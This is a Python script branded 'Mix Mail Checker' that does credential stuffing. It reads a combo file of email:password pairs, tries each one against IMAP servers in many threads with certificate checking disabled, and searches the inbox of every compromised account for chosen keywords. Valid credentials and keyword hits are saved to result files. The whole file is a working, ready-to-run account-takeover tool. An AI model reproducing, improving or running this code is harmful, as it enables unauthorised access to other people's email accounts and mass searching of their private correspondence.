import imaplib
import requests
import uuid
import random
import sys, os
from colorama import Fore, Style, init
import threading
from datetime import datetime
import concurrent.futures
from tkinter import filedialog, Tk
from pathlib import Path
import ssl
import email
from email.header import decode_header
import re

init(autoreset=True)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

now = datetime.now()
Data = now.strftime("%Y-%m-%d %H-%M-%S")
ResultFOLDER = f"Results/result-{Data}"
os.makedirs(ResultFOLDER, exist_ok=True)

KeywordsFOLDER = os.path.join(ResultFOLDER, "Keywords")
os.makedirs(KeywordsFOLDER, exist_ok=True)

lock = threading.Lock()
hit = 0
custom = 0
bad = 0
totalAccount = 0
processed = 0

def print_banner():
    banner = f"""
{Fore.LIGHTBLUE_EX}██╗   ██╗██████╗ ██████╗ ██╗  ██╗
{Fore.LIGHTBLUE_EX}██║   ██║██╔══██╗██╔══██╗██║  ██║
{Fore.LIGHTBLUE_EX}██║   ██║██████╔╝██║  ██║███████║
{Fore.LIGHTBLUE_EX}██║   ██║██╔═══╝ ██║  ██║██╔══██║
{Fore.LIGHTBLUE_EX}╚██████╔╝██║     ██████╔╝██║  ██║
{Fore.LIGHTBLUE_EX} ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝
{Fore.LIGHTBLUE_EX}      Mix Mail Checker - By @updh1
{Style.RESET_ALL}
    """
    print(banner)

def saveResult(acc, status, keyword_results=None, total_msgs=0):
    global ResultFOLDER, KeywordsFOLDER
    
    validFile = os.path.join(ResultFOLDER, "valid_imap.txt")
    
    with open(validFile, "a", encoding='utf-8') as f:
        f.write(f"{acc}\n")
    
    if status == "HIT" and keyword_results:
        for kw, count in keyword_results.items():
            safe_keyword = kw.replace(" ", "_").replace(",", "_")
            keyword_file = os.path.join(KeywordsFOLDER, f"{safe_keyword}.txt")
            with open(keyword_file, "a", encoding='utf-8') as f:
                f.write(f"{acc} | [{kw}: {count}] | Total msg: {total_msgs}\n")

def select_combo_file():
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    file_path = filedialog.askopenfilename(
        title="Select combo file (email:password)",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    root.destroy()
    return file_path

def load_keywords():
    keyword_file = Path("keywords.txt")
    if not keyword_file.exists():
        print(f"{Fore.RED}[!] keywords.txt not found!{Style.RESET_ALL}")
        sys.exit(1)
    
    with open(keyword_file, 'r', encoding='utf-8') as f:
        words = [line.strip().lower() for line in f if line.strip()]
    
    if not words:
        print(f"{Fore.RED}[!] keywords.txt is empty!{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}[+] Loaded {len(words)} keywords{Style.RESET_ALL}")
    return words

def remove_duplicates(accounts):
    seen = set()
    unique_accounts = []
    duplicates = 0
    
    for acc in accounts:
        if acc not in seen:
            seen.add(acc)
            unique_accounts.append(acc)
        else:
            duplicates += 1
    
    if duplicates > 0:
        print(f"{Fore.YELLOW}[!] Removed {duplicates} duplicate accounts{Style.RESET_ALL}")
    
    return unique_accounts

def decode_mime_header(header):
    if header is None:
        return ""
    decoded_parts = decode_header(header)
    parts = []
    for part, charset in decoded_parts:
        if isinstance(part, bytes):
            try:
                parts.append(part.decode(charset or 'utf-8', errors='ignore'))
            except (LookupError, TypeError):
                parts.append(part.decode('utf-8', errors='ignore'))
        else:
            parts.append(str(part))
    return "".join(parts)

def parse_email_body(msg):
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            content_type = part.get_content_type()
            content_disposition = str(part.get("Content-Disposition"))
            
            if content_type in ["text/plain", "text/html"] and "attachment" not in content_disposition:
                try:
                    payload = part.get_payload(decode=True)
                    charset = part.get_content_charset() or 'utf-8'
                    part_body = payload.decode(charset, errors='replace')
                    if content_type == "text/html" and BeautifulSoup:
                        soup = BeautifulSoup(part_body, "html.parser")
                        body += soup.get_text()
                    else:
                        body += part_body
                    body += "\n"
                except Exception:
                    continue
    else:
        try:
            payload = msg.get_payload(decode=True)
            charset = msg.get_content_charset() or 'utf-8'
            body = payload.decode(charset, errors='replace')
            if msg.get_content_type() == "text/html" and BeautifulSoup:
                soup = BeautifulSoup(body, "html.parser")
                body = soup.get_text()
        except Exception:
            body = ""
    return body

def auto_detect_imap_server(email):
    try:
        domain = email.split('@')[1].lower()
        imap_servers = {
            'gmail.com': 'imap.gmail.com', 'googlemail.com': 'imap.gmail.com',
            'outlook.com': 'outlook.office365.com', 'hotmail.com': 'outlook.office365.com',
            'live.com': 'outlook.office365.com', 'msn.com': 'outlook.office365.com',
            'yahoo.com': 'imap.mail.yahoo.com', 'yahoo.co.uk': 'imap.mail.yahoo.com',
            'aol.com': 'imap.aol.com', 'icloud.com': 'imap.mail.me.com',
            'me.com': 'imap.mail.me.com', 'mac.com': 'imap.mail.me.com',
            'yandex.com': 'imap.yandex.com', 'yandex.ru': 'imap.yandex.ru',
            'mail.com': 'imap.mail.com', 'protonmail.com': 'mail.protonmail.com',
            'gmx.com': 'imap.gmx.com', 'gmx.net': 'imap.gmx.net',
            'web.de': 'imap.web.de', 't-online.de': 'imap.t-online.de',
            'orange.fr': 'imap.orange.fr', 'laposte.net': 'imap.laposte.net',
            'libero.it': 'imap.libero.it', 'virgilio.it': 'imap.virgilio.it',
            'wp.pl': 'imap.wp.pl', 'o2.pl': 'imap.o2.pl',
            'interia.pl': 'imap.interia.pl', 'onet.pl': 'imap.onet.pl'
        }
        if domain in imap_servers:
            return imap_servers[domain]
        else:
            return f"imap.{domain}"
    except Exception:
        return None

def get_total_messages_imap(imap):
    try:
        status, data = imap.search(None, "ALL")
        if status == "OK" and data[0]:
            return len(data[0].split())
        return 0
    except:
        return 0

def imap_login_and_check(email, pasw, keywords_list):
    try:
        domain = auto_detect_imap_server(email)
        if not domain:
            return {'status': 'bad'}
        
        keyword_results = {}
        total_msgs = 0
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with imaplib.IMAP4_SSL(domain, ssl_context=context, timeout=15) as imap:
            try:
                imap.login(email, pasw)
            except imaplib.IMAP4.error:
                return {'status': 'bad'}
            
            try:
                imap.select("inbox")
            except:
                return {'status': 'bad'}
            
            total_msgs = get_total_messages_imap(imap)
            
            for kw in keywords_list:
                try:
                    status, data = imap.search(None, f'BODY "{kw}"')
                    if status == "OK" and data[0]:
                        count = len(data[0].split())
                        if count > 0:
                            keyword_results[kw] = count
                    else:
                        status, data = imap.search(None, f'TEXT "{kw}"')
                        if status == "OK" and data[0]:
                            count = len(data[0].split())
                            if count > 0:
                                keyword_results[kw] = count
                except:
                    pass
            
            if keyword_results:
                return {
                    'status': "hit",
                    'acc': f"{email}:{pasw}",
                    'keyword_results': keyword_results,
                    'total_msgs': total_msgs
                }
            else:
                return {
                    'status': "valid",
                    'acc': f"{email}:{pasw}",
                    'total_msgs': total_msgs
                }
                
    except Exception as e:
        return {'status': 'bad'}

def microsoft_login_and_check(email, pasw, keywords_list):
    try:
        return imap_login_and_check(email, pasw, keywords_list)
    except:
        return {'status': 'bad'}

def processAccount(acc, keywords):
    global hit, custom, bad, totalAccount, processed
    
    try:
        if ":" not in acc:
            with lock:
                bad += 1
                processed += 1
            return
        
        email, pasw = acc.split(':', 1)
        email = email.strip()
        pasw = pasw.strip()
        
        if any(x in email.lower() for x in ["@hotmail", "@outlook", "@msn", "@live"]):
            result = microsoft_login_and_check(email, pasw, keywords)
        else:
            result = imap_login_and_check(email, pasw, keywords)
        
        with lock:
            if result['status'] == "bad":
                bad += 1
                print(f"{Fore.RED}[-] {email}:{pasw}{Style.RESET_ALL}")
            elif result['status'] == "valid":
                custom += 1
                saveResult(result['acc'], "CUSTOM")
                print(f"{Fore.GREEN}[+] {email}:{pasw}{Style.RESET_ALL}")
            elif result['status'] == "custom":
                custom += 1
                saveResult(result['acc'], "CUSTOM")
                print(f"{Fore.YELLOW}[?] {result['acc']}{Style.RESET_ALL}")
            elif result['status'] == "hit":
                hit += 1
                keyword_results = result.get('keyword_results', {})
                total_msgs = result.get('total_msgs', 0)
                saveResult(result['acc'], "HIT", keyword_results, total_msgs)
                
                keyword_list = []
                for kw, count in keyword_results.items():
                    keyword_list.append(f"{kw}: {count}")
                keywords_str = ", ".join(keyword_list)
                
                print(f"{Fore.GREEN}[+] {email}:{pasw}{Style.RESET_ALL} | {Fore.WHITE}Keywords: {keywords_str} | Total msg: {Fore.CYAN}{total_msgs}{Style.RESET_ALL}")
            
            processed += 1
            
    except Exception as e:
        with lock:
            bad += 1
            processed += 1

def main():
    global hit, custom, bad, totalAccount, processed
    
    print_banner()
    print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
    
    try:
        print(f"{Fore.YELLOW}[*] Opening file dialog...{Style.RESET_ALL}")
        file_path = select_combo_file()
        if not file_path:
            print(f"{Fore.RED}[!] No file selected. Exiting.{Style.RESET_ALL}")
            sys.exit(0)
        
        keywords = load_keywords()
        
        try:
            threads = int(input(f"{Fore.CYAN}[?] Enter threads count: {Style.RESET_ALL}"))
        except ValueError:
            threads = 50
            print(f"{Fore.YELLOW}[!] Using default 50 threads.{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] Loading accounts and removing duplicates...{Style.RESET_ALL}")
        raw_accounts = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    raw_accounts.append(line)
        
        accounts = remove_duplicates(raw_accounts)
        totalAccount = len(accounts)
        processed = 0
        
        os.system('clear' if os.name == 'posix' else 'cls')
        print_banner()
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Accounts: {totalAccount} | Threads: {threads}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(processAccount, acc, keywords): acc for acc in accounts}
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        
        print(f"\n\n{Fore.GREEN}[+] Finished! Results saved in: {ResultFOLDER}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Valid (HIT): {hit} | Custom: {custom} | Invalid: {bad}{Style.RESET_ALL}")
        input(f"{Fore.YELLOW}[*] Press Enter to exit...{Style.RESET_ALL}")
        
    except FileNotFoundError:
        print(f"\n{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
